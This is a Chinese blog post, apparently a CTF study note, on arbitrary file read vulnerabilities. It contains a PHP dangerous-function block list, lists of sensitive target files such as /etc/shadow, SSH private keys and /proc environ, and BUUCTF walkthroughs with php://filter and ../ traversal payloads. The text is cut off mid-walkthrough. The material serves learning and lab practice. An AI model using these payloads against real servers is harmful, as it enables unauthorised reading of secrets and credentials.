    <link href="https://frankcao3.github.io/posts/15275"/>
    <id>https://frankcao3.github.io/posts/15275</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-05T12:01:17.336Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220804214515223.png" alt="image-20220804214515223"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>攻击者通过一些手段可以读取服务器上开发者不允许读到的文件。</p><p>主要读取的文件是服务器的各种配置文件、文件形式存储的密钥、服务器信息（包括正在执行的进程信息）、历史命令、网络信息、应用源码及二进制程序。</p><h3 id="开发语言相关的触发点"><a href="#开发语言相关的触发点" class="headerlink" title="开发语言相关的触发点"></a>开发语言相关的触发点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">phpinfo()</span><br><span class="line">功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line">passthru()</span><br><span class="line">功能描述：允许执行一个外部程序并回显输出，类似于 exec()。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">exec()</span><br><span class="line">功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">system()</span><br><span class="line">功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">chroot()</span><br><span class="line">功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式</span><br><span class="line">PHP 时才能工作，且该函数不适用于 Windows 系统。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">scandir()</span><br><span class="line">功能描述：列出指定路径中的文件和目录。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line">chgrp()</span><br><span class="line">功能描述：改变文件或目录所属的用户组。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">chown()</span><br><span class="line">功能描述：改变文件或目录的所有者。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">shell_exec()</span><br><span class="line">功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">proc_open()</span><br><span class="line">功能描述：执行一个命令并打开文件指针用于读取以及写入。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">proc_get_status()</span><br><span class="line">功能描述：获取使用 proc_open() 所打开进程的信息。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">error_log()</span><br><span class="line">功能描述：将错误信息发送到指定位置（文件）。</span><br><span class="line">安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode，</span><br><span class="line">执行任意命令。</span><br><span class="line">危险等级：低</span><br><span class="line"></span><br><span class="line">ini_alter()</span><br><span class="line">功能描述：是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。</span><br><span class="line">具体参见 ini_set()。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">ini_set()</span><br><span class="line">功能描述：可用于修改、设置 PHP 环境配置参数。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">ini_restore()</span><br><span class="line">功能描述：可用于恢复 PHP 环境配置参数到其初始值。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">dl()</span><br><span class="line">功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">pfsockopen()</span><br><span class="line">功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">syslog()</span><br><span class="line">功能描述：可调用 UNIX 系统的系统层 syslog() 函数。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line">readlink()</span><br><span class="line">功能描述：返回符号连接指向的目标文件内容。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line">symlink()</span><br><span class="line">功能描述：在 UNIX 系统中建立一个符号链接。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">popen()</span><br><span class="line">功能描述：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">stream_socket_server()</span><br><span class="line">功能描述：建立一个 Internet 或 UNIX 服务器连接。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line">putenv()</span><br><span class="line">功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数</span><br><span class="line">修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line">禁用方法如下：</span><br><span class="line">打开/etc/php.ini文件，</span><br><span class="line">查找到 disable_functions ，添加需禁用的函数名，如下：</span><br><span class="line">phpinfo,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen </span><br></pre></td></tr></table></figure><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><ul><li><p>标准库函数：**file_get_contents()<strong>、</strong>file()<strong>、</strong>fopen()<strong>函数（及其文件指针操作函数</strong>fread()<strong>、</strong>fgets()**等）</p></li><li><p>与文件包含相关的函数（include()、require()、include_once()、require_once()等）</p><p>以及一些<strong>php:&#x2F;&#x2F;伪协议</strong>的使用：（<strong>参考文件包含</strong>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure></li><li><p>通过PHP读文件的执行系统命令（**system()<strong>、</strong>exec()**等）。</p></li><li><p>拓展：php-curl扩展（文件内容作为HTTP body）涉及文件存取的库（如数据库相关扩展、图片相关扩展）、XML模块造成的XXE等。</p></li></ul><blockquote><p><em><strong># 为什么PHP还要还要用这些函数呢？</strong></em></p><p>现在PHP开发技术越来越倾向于单入口、多层级、多通道的模式，其中涉及PHP文件之间的调用密集且频繁。<br>开发者为了写出一个高复用性的文件调用函数，就需要将一些动态的信息传入（如可变的部分文件名）那些函数，如果在程序入口处没有利用switch等分支语句对这些动态输入的数据加以控制，攻击者就很容易注入恶意的路径，从而实现任意文件读取甚至任意文件包含。</p><p><em><strong>Wrapper 机制</strong></em></p><p>PHP向用户提供的指定待打开文件的方式不是简简单单的一个路径，而是一个文件流。我们可以将其简单理解成PHP提供的一套协议。例如，在浏览器中输入http: &#x2F;&#x2F;host: port&#x2F;xxx后，就能通过HTTP请求到远程服务器上对应的文件，而在PHP中有很多功能不同但形式相似的协议，统称为Wrapper，其中最具特色的协议便是php:&#x2F;&#x2F;协议，更有趣的是，PHP提供了接口供开发者编写自定义的wrapper（stream_wrapper_register）。</p><p><em><strong>Filter 机制</strong></em></p><p>PHP中另一个具有特色的机制是Filter，其作用是对目前的Wrapper进行一定的处理（如把当前文件流的内容全部变为大写）。</p><p>对于自定义的Wrapper而言，Filter需要开发者通过stream_filter_register进行注册。</p><p>而PHP内置的一些Wrapper会自带一些Filter，如php:&#x2F;&#x2F;协议存在，所示类型的Filter。</p><p>PHP的Filter特性给我们进行任意文件读取提供了很多便利。</p><p>假设服务端include函数的路径参数可控，正常情况下它会将目标文件当作PHP文件去解析，如果解析的文件中存在“&lt;？php”等PHP的相关标签，那么标签中的内容会被作为PHP代码执行。比较常见的Base64相关的Filter可将文件流编码成Base64的形式，这样读取的文件内容中就不会存在PHP标签。而更严重的是，如果服务端开启了远程文件包含选项allow_url_include，我们就可以直接执行远程PHP代码。</p></blockquote><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>漏洞经常出现在框架<strong>请求静态资源文件</strong>部分，也就是最后读取文件内容的open函数，但直接导致漏洞的成因往往是框架开发者忽略了Python函数的feature。</p><p>涉及文件操作的应用也因为滥用open函数、模板的不当渲染导致任意文件读取。如：将用户输入的某些数据作为文件名的一部分（常见于认证服务或者日志服务）存储在服务器中，在取文件内容的部分也通过将经过处理的用户输入数据作为索引去查找相关文件。<br>攻击者构造软链接放入压缩包，解压后的内容会直接指向服务器相应文件，攻击者访问解压后的链接文件会返回链接指向文件的相应内容。</p><p>Python的模板注入、反序列化等漏洞都可造成一定程度的任意文件读取。</p><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>Java本身的文件读取函数FileInputStream、XXE导致的文件读取。</p><p>Java的一些模块也支持<code>file://</code>协议，这是Java应用中出现任意文件读取最多的地方，如Spring Cloud Config Server路径穿越与任意文件读取漏洞（CVE-2019-3799）、Jenkins任意文件读取漏洞（CVE-2018-1999002）等。</p><h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><p>Ruby的任意文件读取漏洞通常与Rails框架相关。到目前为止，我们已知的通用漏洞为Ruby On Rails远程代码执行漏洞（CVE-2016-0752）、Ruby On Rails路径穿越与任意文件读取漏洞（CVE-2018-3760）、Ruby On Rails路径穿越与任意文件读取漏洞（CVE-2019-5418）。笔者在CTF竞赛中就曾遇到Ruby On Rails远程代码执行漏洞（CVE-2016-0752）的利用。</p><h4 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h4><p>Node.js的express模块曾存在任意文件读取漏洞（CVE-2017-14849)。</p><p>CTF中Node的文件读取漏洞通常为模板注入、代码注入等情况。</p><h3 id="中间件-x2F-服务器相关触发点"><a href="#中间件-x2F-服务器相关触发点" class="headerlink" title="中间件&#x2F;服务器相关触发点"></a>中间件&#x2F;服务器相关触发点</h3><h4 id="Nginx错误配置"><a href="#Nginx错误配置" class="headerlink" title="Nginx错误配置"></a>Nginx错误配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Location /static&#123;</span><br><span class="line">Alias /home/myapp/static/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果配置文件中包含上面这段内容，很可能是运维或者开发人员想让用户可以访问static目录（一般是静态资源目录）。<br>如果用户请求的Web路径是&#x2F;static…&#x2F;，拼接到alias上就变成了&#x2F;home&#x2F;myapp&#x2F;static&#x2F;…&#x2F;，此时便会产生目录穿越漏洞，并且穿越到了myapp目录。</p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>以mysql为例：</p><p>MySQL的load_file()函数可以进行文件读取，但是load_file()函数读取文件首先需要数据库配置FILE权限（数据库root用户一般都有）。<br>其次需要执行load_file()函数的MySQL用户&#x2F;用户组对于目标文件具有可读权限（很多配置文件都是所有组&#x2F;用户可读），主流Linux系统还需要Apparmor配置目录白名单（默认白名单限制在MySQL相关的目录下）。</p><h4 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h4><p>bash命令ln-s可以创建一个指向指定文件的软链接文件，然后将这个软链接文件上传至服务器，当我们再次请求访问这个链接文件时，实际上是请求在服务端它指向的文件。</p><h4 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a>FFmpeg</h4><p>参考一道题目：<a href="https://www.cnblogs.com/iamstudy/articles/2017_quanguo_ctf_web_writeup.html">https://www.cnblogs.com/iamstudy/articles/2017_quanguo_ctf_web_writeup.html</a></p><h4 id="Docker-API"><a href="#Docker-API" class="headerlink" title="Docker-API"></a>Docker-API</h4><p>Docker-API可以控制Docker的行为，一般来说，Docker-API通过UNIX Socket通信，也可以通过HTTP直接通信。<br>当我们遇见SSRF漏洞时，尤其是可以通过SSRF漏洞进行UNIX Socket通信的时候，就可以通过操纵Docker-API把本地文件载入Docker新容器进行读取（利用Docker的ADD、COPY操作），从而形成一种另类的任意文件读取。</p><h3 id="文件读取的目标目录"><a href="#文件读取的目标目录" class="headerlink" title="文件读取的目标目录"></a>文件读取的目标目录</h3><h4 id="x2F-etc下的一些目录"><a href="#x2F-etc下的一些目录" class="headerlink" title="&#x2F;etc下的一些目录"></a>&#x2F;etc下的一些目录</h4><p>&#x2F;etc：&#x2F;etc目录下多是各种应用或系统配置文件，所以其下的文件是进行文件读取的首要目标。</p><ul><li>&#x2F;etc&#x2F;passwd：&#x2F;etc&#x2F;passwd文件是Linux系统保存用户信息及其工作目录的文件，权限是所有用户&#x2F;组可读，一般被用作Linux系统下文件读取漏洞存在性判断的基准。读到这个文件我们就可以知道系统存在哪些用户、他们所属的组是什么、工作目录是什么。</li><li>&#x2F;etc&#x2F;shadow：&#x2F;etc&#x2F;shadow是Linux系统保存用户信息及（可能存在）密码（hash）的文件，权限是root用户可读写、shadow组可读。所以一般情况下，这个文件是不可读的。</li><li>&#x2F;etc&#x2F;apache2&#x2F;*：是Apache配置文件，可以获知Web目录、服务端口等信息。CTF有些题目需要参赛者确认Web路径。</li><li>&#x2F;etc&#x2F;nginx&#x2F;*：是Nginx配置文件（Ubuntu等系统），可以获知Web目录、服务端口等信息。</li><li>&#x2F;etc&#x2F;apparmor(.d)&#x2F;*：是Apparmor配置文件，可以获知各应用系统调用的白名单、黑名单。例如，通过读配置文件查看MySQL是否禁止了系统调用，从而确定是否可以使用UDF（User Defined Functions）执行系统命令。</li><li>&#x2F;etc&#x2F;(cron.d&#x2F;*|crontab)：定时任务文件。有些CTF题目会设置一些定时任务，读取这些配置文件就可以发现隐藏的目录或其他文件。</li><li>&#x2F;etc&#x2F;environment：是环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况。</li><li>&#x2F;etc&#x2F;hostname：表示主机名。</li><li>&#x2F;etc&#x2F;hosts：是主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，参赛者可以探测网卡信息和内网IP&#x2F;域名。</li><li>&#x2F;etc&#x2F;issue：指明系统版本。</li><li>&#x2F;etc&#x2F;mysql&#x2F;*：是MySQL配置文件。</li><li>&#x2F;etc&#x2F;php&#x2F;*：是PHP配置文件。</li></ul><h4 id="x2F-proc目录"><a href="#x2F-proc目录" class="headerlink" title="&#x2F;proc目录"></a>&#x2F;proc目录</h4><p>&#x2F;proc目录通常存储着<strong>进程动态运行的各种信息</strong>，本质上是一种<strong>虚拟文件系统</strong>。&#x2F;proc 文件系统可以被用于收集有用的关于系统和运行中的内核的信息。</p><ul><li><p>&#x2F;proc&#x2F;cpuinfo：CPU 的信息 (型号, 家族, 缓存大小等) </p></li><li><p>&#x2F;proc&#x2F;meminfo：物理内存、交换空间等的信息 </p></li><li><p>&#x2F;proc&#x2F;mounts：已加载的文件系统的列表 </p></li><li><p>&#x2F;proc&#x2F;devices：可用设备的列表 </p></li><li><p>&#x2F;proc&#x2F;filesystems：被支持的文件系统 </p></li><li><p>&#x2F;proc&#x2F;modules：已加载的模块 </p></li><li><p>&#x2F;proc&#x2F;version：内核版本 </p></li><li><p>&#x2F;proc&#x2F;[pid]&#x2F;cmdline：系统启动时输入的内核命令行参数。</p></li><li><p>&#x2F;proc&#x2F;[pid]&#x2F;cwd：通过cwd命令可以直接跳转到当前目录。</p></li><li><p>&#x2F;proc&#x2F;[pid]&#x2F;environ：环境变量中可能存在secret_key，这时也可以通过environ进行读取。</p></li></ul><p>上述路径中的PID是需要填写的进程号，当然我们不知道，但这里我们可以用 <strong>self</strong> 来表示我们自己现在正在用的进程。</p><h4 id="其他目录"><a href="#其他目录" class="headerlink" title="其他目录"></a>其他目录</h4><ul><li><p>Nginx配置文件可能存在其他路径：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;*</p></li><li><p>日志文件：&#x2F;var&#x2F;log&#x2F;*</p></li><li><p>Apache默认Web根目录：&#x2F;var&#x2F;www&#x2F;html</p></li><li><p>PHP session目录：&#x2F;var&#x2F;lib&#x2F;php(5)&#x2F;sessions 可能泄露用户Session</p></li><li><p>用户目录：[user_dir_you_know]&#x2F;.bash_history 历史命令执行</p><p>[user_dir_you_know]&#x2F;.bashrc 部分环变量<br>[user_dir_you_know]&#x2F;.ssh&#x2F;id_rsa(.pub) ssh登录的私钥&#x2F;公钥<br>[user_dir_you_know]&#x2F;.viminfo vim的使用记录</p></li></ul><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>CTF题目：BUUCTF第一章 web入门 <a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p><p>参考：<a href="https://blog.csdn.net/qq_40909772/article/details/121381691">https://blog.csdn.net/qq_40909772/article/details/121381691</a></p><h3 id="afr-1"><a href="#afr-1" class="headerlink" title="afr_1"></a>afr_1</h3><p>使用php伪协议<strong>php:&#x2F;&#x2F;filter</strong>读取文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?p=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><h3 id="afr-2"><a href="#afr-2" class="headerlink" title="afr_2"></a>afr_2</h3><p>先目录扫描发现了img目录，直接进行访问。</p><p>然后尝试回溯目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ec45dcbb-a35f-468b-9d40-51e0a6da2a38.node4.buuoj.cn/img/../</span><br></pre></td></tr></table></figure><h3 id="afr-3"><a href="#afr-3" class="headerlink" title="afr_3"></a>afr_3</h3><p>参考：<strong><a href="https://blog.csdn.net/AAAAAAAAAAAA66/article/details/121490787">https://blog.csdn.net/AAAAAAAAAAAA66/article/details/121490787</a></strong></p><p>随意输入666：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143212419.png" alt="image-20220812143212419"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143223780.png" alt="image-20220812143223780"></p><p>进入article，发现文件参数name，但是没有文件后缀，应该是在后端给加上的：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143253201.png" alt="image-20220812143253201"></p><h4 id="判断文件读取"><a href="#判断文件读取" class="headerlink" title="判断文件读取"></a>判断文件读取</h4><p><strong>判断是否存在文件读取漏洞</strong>，修改参数值试试：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143428107.png" alt="image-20220812143428107"></p><p>发现可以读取其他文件，并且这里的路径为<code>/home/nu11111111l/articles/</code></p><h4 id="尝试读取敏感文件"><a href="#尝试读取敏感文件" class="headerlink" title="尝试读取敏感文件"></a>尝试读取敏感文件</h4><p><strong>尝试回溯路径获取系统文件</strong>，构造payload：<code>article?name=../../../etc/passwd</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143728122.png" alt="image-20220812143728122"></p><p>但是并没有什么信息。</p><h4 id="突破口为-x2F-proc"><a href="#突破口为-x2F-proc" class="headerlink" title="突破口为&#x2F;proc"></a>突破口为&#x2F;proc</h4><p><strong>其实这一题的考点是&#x2F;proc目录的读取</strong></p><p><strong>查看系统启动时执行的命令：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">article?name=../../../proc/self/cmdline</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812144010868.png" alt="image-20220812144010868"></p><p>发现server.py文件，查看该文件内容：</p><p>&#x2F;proc&#x2F;[pid]&#x2F;cwd：通过cwd命令可以直接跳转到当前目录（网站目录）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">article?name=../../../proc/self/cwd/server.py</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812143714112.png" alt="image-20220812143714112"></p><p>可以发现文件中执行了 flag.py 和 key.py 这两个文件。通过F12查看源码可以更清楚的查看server.py的内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> ( Flask, render_template, request, url_for, redirect, session, render_template_string )</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line">execfile(<span class="string">&#x27;flag.py&#x27;</span>)</span><br><span class="line">execfile(<span class="string">&#x27;key.py&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">FLAG = flag</span><br><span class="line">app.secret_key = key</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/n1page&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">n1page</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line">    n1code = request.form.get(<span class="string">&quot;n1code&quot;</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># ----------------------------下面的代码存在SSTI模板注入--------------------------</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;n1code&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        session[<span class="string">&#x27;n1code&#x27;</span>] = n1code</span><br><span class="line">    template = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        template = <span class="string">&#x27;&#x27;&#x27;&amp;lt;h1&amp;gt;N1 Page&amp;lt;/h1&amp;gt; &amp;lt;div class=&quot;row&amp;gt; &amp;lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&amp;gt; Hello : %s, why you don&#x27;t look at our &amp;lt;a href=&#x27;/article?name=article&#x27;&amp;gt;article&amp;lt;/a&amp;gt;? &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &#x27;&#x27;&#x27;</span> % session[<span class="string">&#x27;n1code&#x27;</span>]</span><br><span class="line">        session[<span class="string">&#x27;n1code&#x27;</span>] = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;main.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/article&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">article</span>():</span><br><span class="line">    error = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        page = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">&#x27;article&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> page.find(<span class="string">&#x27;flag&#x27;</span>)&amp;gt;=<span class="number">0</span>:          <span class="comment"># 这里name参数过滤了flag关键词</span></span><br><span class="line">        page = <span class="string">&#x27;notallowed.txt&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        template = <span class="built_in">open</span>(<span class="string">&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(page)).read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        template = e</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, template=template)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="分析源码，确定漏洞利用"><a href="#分析源码，确定漏洞利用" class="headerlink" title="分析源码，确定漏洞利用"></a>分析源码，确定漏洞利用</h4><p>分析源码，可以知道：</p><p>1.文件夹有2个python文件 flag.py 和密钥文件 key.py。</p><p>2.不能直接访问 